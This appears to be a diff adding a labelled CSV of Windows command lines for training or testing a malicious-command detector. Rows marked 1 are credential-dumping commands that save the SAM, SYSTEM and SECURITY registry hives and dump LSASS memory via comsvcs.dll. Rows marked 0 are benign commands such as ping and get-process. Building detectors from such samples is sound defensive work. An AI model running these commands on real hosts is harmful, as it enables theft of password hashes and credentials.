+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+reg query hkcu\console,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+cmd.exe /c ping 8.8.8.8,0
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+reg query hkcu\console,0
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+wmic useraccount get name,0
+reg query hkcu\console,0
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+reg query hkcu\console,0
+reg query hkcu\console,0
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+reg query hkcu\console,0
+powershell get-process | select-object name,0
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+reg query hkcu\console,0
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+wmic useraccount get name,0
+reg query hkcu\console,0
+reg query hkcu\console,0
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+reg query hkcu\console,0
+powershell get-process | select-object name,0
+wmic useraccount get name,0
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+powershell get-process | select-object name,0
+wmic useraccount get name,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+wmic useraccount get name,0
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+wmic useraccount get name,0
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+wmic useraccount get name,0
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+wmic useraccount get name,0
+powershell get-process | select-object name,0
+wmic useraccount get name,0
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+wmic useraccount get name,0
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+wmic useraccount get name,0
+reg query hkcu\console,0
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+reg query hkcu\console,0
+powershell get-process | select-object name,0
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+reg query hkcu\console,0
+powershell get-process | select-object name,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+cmd.exe /c ping 8.8.8.8,0
+reg query hkcu\console,0
+reg query hkcu\console,0
+powershell get-process | select-object name,0
+powershell get-process | select-object name,0
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+wmic useraccount get name,0
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+wmic useraccount get name,0
+reg query hkcu\console,0
+reg query hkcu\console,0
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+wmic useraccount get name,0
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+wmic useraccount get name,0
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+reg query hkcu\console,0
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+wmic useraccount get name,0
+powershell get-process | select-object name,0
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+reg query hkcu\console,0
+powershell get-process | select-object name,0
+wmic useraccount get name,0
+cmd.exe /c ping 8.8.8.8,0
+cmd.exe /c ping 8.8.8.8,0
+cmd.exe /c ping 8.8.8.8,0
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+wmic useraccount get name,0
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+reg query hkcu\console,0
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+reg query hkcu\console,0
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+wmic useraccount get name,0
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+reg query hkcu\console,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+wmic useraccount get name,0
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+wmic useraccount get name,0
+powershell get-process | select-object name,0
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+wmic useraccount get name,0
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+reg query hkcu\console,0
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+wmic useraccount get name,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+cmd.exe /c ping 8.8.8.8,0
+wmic useraccount get name,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+wmic useraccount get name,0
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+wmic useraccount get name,0
+reg query hkcu\console,0
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+reg query hkcu\console,0
+reg query hkcu\console,0
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+wmic useraccount get name,0
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+wmic useraccount get name,0
+reg query hkcu\console,0
+wmic useraccount get name,0
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+reg query hkcu\console,0
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+wmic useraccount get name,0
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+wmic useraccount get name,0
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+reg query hkcu\console,0
+wmic useraccount get name,0
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+wmic useraccount get name,0
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+wmic useraccount get name,0
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+reg query hkcu\console,0
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+wmic useraccount get name,0
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+reg query hkcu\console,0
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+wmic useraccount get name,0
+powershell get-process | select-object name,0
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+reg query hkcu\console,0
+reg query hkcu\console,0
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+reg query hkcu\console,0
+wmic useraccount get name,0
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+reg query hkcu\console,0
+reg query hkcu\console,0
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+wmic useraccount get name,0
+wmic useraccount get name,0
+cmd.exe /c ping 8.8.8.8,0
+wmic useraccount get name,0
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+powershell get-process | select-object name,0
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+reg query hkcu\console,0
